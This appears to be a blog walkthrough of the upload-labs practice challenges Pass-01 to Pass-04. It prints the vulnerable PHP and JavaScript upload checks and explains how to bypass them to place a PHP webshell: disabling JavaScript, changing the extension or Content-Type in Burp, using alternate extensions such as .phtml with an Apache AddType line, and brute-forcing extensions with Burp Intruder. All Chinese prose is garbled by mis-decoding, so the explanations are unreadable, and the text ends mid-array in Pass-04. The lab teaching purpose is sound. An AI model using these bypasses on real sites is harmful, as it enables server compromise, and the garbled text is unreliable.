<h1 id="å¼€å§‹é—¯å…³"><a href="#å¼€å§‹é—¯å…³" class="headerlink" title="å¼€å§‹é—¯å…³"></a>å¼€å§‹é—¯å…³</h1><h2 id="Pass-01"><a href="#Pass-01" class="headerlink" title="Pass-01"></a>Pass-01</h2><p>ç¬¬ä¸€æ­¥æŸ¥çœ‹æºç </p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function">checkFile</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">var</span> file <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementsByName</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'upload_file'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>value<span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>file <span class="token operator">==</span> <span class="token constant">null</span> <span class="token operator">||</span> file <span class="token operator">==</span> <span class="token double-quoted-string string">""</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token function">alert</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"è¯·é€‰æ‹©è¦ä¸Šä¼ çš„æ–‡ä»¶!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token boolean constant">false</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token comment">//å®šä¹‰å…è®¸ä¸Šä¼ çš„æ–‡ä»¶ç±»å‹</span>
    <span class="token keyword">var</span> allow_ext <span class="token operator">=</span> <span class="token double-quoted-string string">".jpg|.png|.gif"</span><span class="token punctuation">;</span>
    <span class="token comment">//æå–ä¸Šä¼ æ–‡ä»¶çš„ç±»å‹</span>
    <span class="token keyword">var</span> ext_name <span class="token operator">=</span> file<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span>file<span class="token punctuation">.</span><span class="token function">lastIndexOf</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"."</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">//åˆ¤æ–­ä¸Šä¼ æ–‡ä»¶ç±»å‹æ˜¯å¦å…è®¸ä¸Šä¼ </span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>allow_ext<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span>ext_name <span class="token operator">+</span> <span class="token double-quoted-string string">"|"</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">var</span> errMsg <span class="token operator">=</span> <span class="token double-quoted-string string">"è¯¥æ–‡ä»¶ä¸å…è®¸ä¸Šä¼ ï¼Œè¯·ä¸Šä¼ "</span> <span class="token operator">+</span> allow_ext <span class="token operator">+</span> <span class="token double-quoted-string string">"ç±»å‹çš„æ–‡ä»¶,å½“å‰æ–‡ä»¶ç±»å‹ä¸ºï¼š"</span> <span class="token operator">+</span> ext_name<span class="token punctuation">;</span>
        <span class="token function">alert</span><span class="token punctuation">(</span>errMsg<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token boolean constant">false</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span></code></pre>
<p>å¯ä»¥çœ‹å‡ºå¯ä»¥ä¼ å…¥çš„æ˜¯<code>.jpg/.png/,gif</code>ç±»å‹çš„å›¾ç‰‡ã€‚å› ä¸ºç¬¬ä¸€å…³å˜›ï¼Œé™åˆ¶æ¯”è¾ƒç®€å•ï¼Œæœ‰ä»¥ä¸‹å‡ ç§æ–¹æ³•ã€‚<br>1.ç¦ç”¨js<br>è°·æ­Œæµè§ˆå™¨ç¦ç”¨jsï¼Œå¯ä»¥ç™¾åº¦æœç´¢ï¼Œä¸å†å¤šè¯´ã€‚<br>ç«ç‹æµè§ˆå™¨æ¨èä¸€ä¸ªæ’ä»¶<code>noscript</code>ï¼Œç¦ç”¨jsåå°±å¯ä»¥ä¸Šä¼ phpæ–‡ä»¶äº†ã€‚<br>2.burpæŠ“åŒ…ä¿®æ”¹åç¼€ï¼Œ<br>å…ˆå°†è¦ä¸Šä¼ çš„<code>shell.php</code>åç¼€æ”¹æˆå›¾ç‰‡æ ¼å¼ï¼Œæ¯”å¦‚jpgã€‚<br>ç„¶åä¸Šä¼ ï¼ŒæŠ“åŒ…ï¼Œä¿®æ”¹å›<code>shell.php</code>æ”¾åŒ…ã€‚ä¸Šä¼ æˆåŠŸã€‚<br>3.ç›´æ¥ä¼ å›¾ç‰‡é©¬</p>
<h2 id="Pass-02"><a href="#Pass-02" class="headerlink" title="Pass-02"></a>Pass-02</h2><p>æŸ¥çœ‹æºç </p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean constant">false</span><span class="token punctuation">;</span>
<span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token constant">UPLOAD_PATH</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'type'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token single-quoted-string string">'image/jpeg'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'type'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token single-quoted-string string">'image/png'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'type'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token single-quoted-string string">'image/gif'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
            <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span> <span class="token punctuation">.</span> <span class="token single-quoted-string string">'/'</span> <span class="token punctuation">.</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'name'</span><span class="token punctuation">]</span>            
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">,</span> <span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean constant">true</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
                <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'ä¸Šä¼ å‡ºé”™ï¼'</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'æ–‡ä»¶ç±»å‹ä¸æ­£ç¡®ï¼Œè¯·é‡æ–°ä¸Šä¼ ï¼'</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span><span class="token punctuation">.</span><span class="token single-quoted-string string">'æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼'</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span></code></pre>
<p>è¿™ä¸ªæ˜¯å¯¹Content-typeçš„MIMEç±»å‹è¿›è¡Œé™åˆ¶ã€‚<br>åœ¨DVWAä¸­å°è¯•è¿‡äº†å·²ç»ï¼Œ<br>æŠ“åŒ…ï¼Œå¯¹Content-typeè¿›è¡Œä¿®æ”¹ï¼Œæ”¹ä¸º<code>image/jpeg</code>æˆ–è€…å…¶ä»–ä¸¤ç§ç±»å‹ã€‚ä¸å†èµ˜è¿°ã€‚</p>
<h2 id="Pass-03é»‘åå•éªŒè¯"><a href="#Pass-03é»‘åå•éªŒè¯" class="headerlink" title="Pass-03é»‘åå•éªŒè¯"></a>Pass-03é»‘åå•éªŒè¯</h2><h3 id="æ™®é€šæ–¹æ³•"><a href="#æ™®é€šæ–¹æ³•" class="headerlink" title="æ™®é€šæ–¹æ³•"></a>æ™®é€šæ–¹æ³•</h3><p>æŸ¥çœ‹æºç </p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean constant">false</span><span class="token punctuation">;</span>
<span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token constant">UPLOAD_PATH</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$deny_ext</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'.asp'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'.aspx'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'.php'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'.jsp'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">deldot</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹</span>
        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">strrchr</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//è½¬æ¢ä¸ºå°å†™</span>
        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'::$DATA'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">''</span><span class="token punctuation">,</span> <span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//å»é™¤å­—ç¬¦ä¸²::$DATA</span>
        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//æ”¶å°¾å»ç©º</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">,</span> <span class="token variable">$deny_ext</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
            <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span><span class="token punctuation">.</span><span class="token single-quoted-string string">'/'</span><span class="token punctuation">.</span><span class="token function">date</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"YmdHis"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">,</span><span class="token number">9999</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token variable">$file_ext</span><span class="token punctuation">;</span>            
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">,</span><span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                 <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean constant">true</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
                <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'ä¸Šä¼ å‡ºé”™ï¼'</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'ä¸å…è®¸ä¸Šä¼ .asp,.aspx,.php,.jspåç¼€æ–‡ä»¶ï¼'</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span> <span class="token punctuation">.</span> <span class="token single-quoted-string string">'æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼'</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>è¿™ä¸ªåŸæœ¬ä¸çŸ¥é“è¯¥æ€ä¹ˆæ“ä½œï¼Œçœ‹äº†å¤§ä½¬çš„åšå®¢æ‰çŸ¥é“äº†è¿™ä¸ªæ˜¯é»‘åå•è¿‡æ»¤ï¼ŒæœåŠ¡å™¨æŠŠåç¼€ä¸º<code>.asp .aspx .php .,jps</code> çš„æ–‡ä»¶ç»™è¿‡æ»¤äº†ï¼Œè¦æƒ³åŠæ³•ç»•è¿‡è¿™äº›ã€‚å¯ä»¥ä¸Šä¼ å…¶ä»–ä»»æ„åç¼€ã€‚æ¯”å¦‚è¯´:.phtml .phps .php5 .phtï¼Œä½†å¦‚æœä¸Šä¼ çš„æ˜¯.php5è¿™ç§ç±»å‹æ–‡ä»¶çš„è¯ï¼Œå¦‚æœæƒ³è¦è¢«å½“æˆphpæ‰§è¡Œçš„è¯ï¼Œå‰ææ¡ä»¶æ˜¯Apacheçš„httpd.confæœ‰å¦‚ä¸‹é…ç½®ä»£ç </p>
<pre class="language-bash" data-language="bash"><code class="language-bash">AddType application/x-httpd-php .php .phtml .php5 .pht .phps</code></pre>
<p>è®©Apacheèƒ½å¤Ÿè§£æè¿™äº›åç¼€çš„æ–‡ä»¶ã€‚<br>é…ç½®è·¯å¾„<br><code>D:\phpStudy\PHPTutorial\Apache\conf</code>æˆ‘çš„æ˜¯phpstudyé›†æˆç¯å¢ƒï¼Œæ‰€ä»¥åœ¨phpstudyç›®å½•ä¸‹ã€‚æ‰¾åˆ°(httpd.conf)è¿™ä¸ªæ–‡ä»¶æ‰“å¼€<br><img src="https://img-blog.csdnimg.cn/20200426132330859.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>ä¿®æ”¹æˆå›¾ä¸­çš„æ ·å­ã€‚<br>è¿™ä¸ªæ—¶å€™å°±å¯ä»¥å°†åç¼€æ”¹ä¸º<code>.phtml</code>å†æ¬¡ä¸Šä¼ <br>ä¸Šä¼ æˆåŠŸ<br><img src="https://img-blog.csdnimg.cn/20200426141548939.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>ç”¨èšå‰‘è¿æ¥ä¸€ä¸‹,è¿æ¥å¤±è´¥ã€‚emmmæŒºçƒ¦çš„è¿™ä¸ªï¼Œå¥½é•¿æ—¶é—´äº†ï¼Œè¿˜å¡åœ¨è¿™é‡Œï¼Œæš‚æ—¶ï¼Œæ–¹æ³•æ²¡é”™ï¼Œå¯æ˜¯æˆ‘è¿æ¥æœ¬åœ°çš„å°±æ˜¯è¿ä¸ä¸Šï¼Œæ— è¯­å•¦ã€‚</p>
<h3 id="ä½¿ç”¨burpsuiteçˆ†ç ´é»‘åå•"><a href="#ä½¿ç”¨burpsuiteçˆ†ç ´é»‘åå•" class="headerlink" title="ä½¿ç”¨burpsuiteçˆ†ç ´é»‘åå•"></a>ä½¿ç”¨burpsuiteçˆ†ç ´é»‘åå•</h3><p>äº†è§£åˆ°ä¸€ç§æ–¹æ³•ï¼Œå¯èƒ½æ¯”è¾ƒå°‘è§ï¼Œç°åœ¨åˆ†äº«ä¸€ä¸‹<br>ä¸æ”¹åï¼Œç›´æ¥ä¸Šä¼ phpæ–‡ä»¶<br><img src="https://img-blog.csdnimg.cn/20200509224024679.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>å¼€ä»£ç†æŠ“åŒ…ï¼Œç„¶å<code>Send to intruder</code><br><img src="https://img-blog.csdnimg.cn/2020050922414186.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>è¿›è¡Œphpæ‰©å±•åçš„çˆ†ç ´<br><img src="https://img-blog.csdnimg.cn/20200509224249905.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"><br>é€‰æ‹©å­—å…¸ï¼Œæˆ–è€…è‡ªå·±æ·»åŠ å‚æ•°ã€‚<br><img src="https://img-blog.csdnimg.cn/20200509224434638.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>éšä¾¿å†™å‡ ä¸ªå§ï¼Œæ —å­è€Œå·²ã€‚<br>ç„¶åå°±å¯ä»¥å¼€å§‹çˆ†ç ´äº†ã€‚<br><img src="https://img-blog.csdnimg.cn/20200509224620148.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>ä¸Šé¢çš„æ˜¯å¯ä»¥ä¸Šä¼ çš„ï¼Œä¸‹é¢çš„åˆ™æ˜¯ä¸ç¬¦åˆæ¡ä»¶çš„ã€‚<br>æ‰€ä»¥å°±çŸ¥é“åº”è¯¥ä¼ å…¥ä»€ä¹ˆæ–‡ä»¶äº†ã€‚(å¯èƒ½æƒ³çš„æ˜¯ï¼Œè¿™ä¹Ÿæ²¡æœ‰ä»€ä¹ˆå•Šï¼Œè¿˜ä¸å¦‚ç›´æ¥ä¸Šä¼ phtmlæ–¹ä¾¿ã€‚ç»§ç»­çœ‹)<br>ç„¶åå³é”®å•å‡»ä¸€ä¸ªï¼Œæ‰¾åˆ°<code>Show response in browser</code><br><img src="https://img-blog.csdnimg.cn/20200509224829441.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>ç‚¹å‡»copyï¼Œç„¶åç²˜è´´åˆ°æµè§ˆå™¨<br><img src="https://img-blog.csdnimg.cn/20200509225054720.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"><br>è®°ä½å…³ä»£ç†ï¼Œæš‚åœæŠ“åŒ…ï¼Œå¤åˆ¶åˆ°æµè§ˆå™¨è·‘ä¸€ä¸‹<br><img src="https://img-blog.csdnimg.cn/2020050922522639.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>ä¼šå‘ç°å·²ç»ä¸Šä¼ æˆåŠŸäº†ï¼Œé‚£å…¶ä»–çš„å‘¢ï¼Œä¹Ÿå¯ä»¥éƒ½è¯•è¯•ã€‚<br>æˆ‘å…¨éƒ¨ä¸Šä¼ ï¼Œæœ€åçœ‹æ•ˆæœã€‚<br>ä¸Šä¼ å®Œæˆäº†ï¼Œå¯ä»¥æ‰“å¼€uploadæ–‡ä»¶æŸ¥çœ‹<br><img src="https://img-blog.csdnimg.cn/2020050922561114.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>å®³ï¼Œï¼Œè¿˜æ˜¯è¿æ¥ä¸æˆåŠŸï¼Œä¸çŸ¥é“æ˜¯å“ªé‡Œå‡ºçš„é—®é¢˜ï¼Œå·²ç»å›°æ‰°æˆ‘å¥½ä¹…äº†ã€‚å¤ªéš¾äº†æˆ‘ã€‚<br>æ²¡è§£å†³ï¼Œè®¿é—®ç›´æ¥ä¸‹è½½phtmlæ–‡ä»¶ã€‚æ— è¯­å•¦=_=</p>
<h2 id="Pass-04"><a href="#Pass-04" class="headerlink" title="Pass-04"></a>Pass-04</h2><p>è¿™ä¸€å…³ï¼Œä¼ phtmlæ–‡ä»¶ä¸è¡Œäº†ï¼Œä¹Ÿè¢«åŠ å…¥äº†é»‘åå•ï¼Œæ‰€ä»¥å…ˆæŸ¥çœ‹ä¸‹æºç ï¼Œ<br>æŸ¥çœ‹æºç ï¼š</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean constant">false</span><span class="token punctuation">;</span>
<span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token constant">UPLOAD_PATH</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$deny_ext</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token double-quoted-string string">".php"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".php5"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".php4"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".php3"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".php2"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".php1"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".html"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".htm"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".phtml"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".pht"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".pHp"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".pHp5"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".pHp4"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".pHp3"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".pHp2"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".pHp1"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".Html"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".Htm"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".pHtml"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jsp"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jspa"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jspx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jsw"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jsv"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jspf"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jtml"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jSp"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jSpx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jSpa"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jSw"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jSv"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jSpf"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jHtml"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".asp"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".aspx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".asa"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".asax"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".ascx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".ashx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".asmx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".cer"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".aSp"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".aSpx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".aSa"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".aSax"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".aScx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".aShx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".aSmx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".cEr"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".sWf"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".swf"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".ini"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
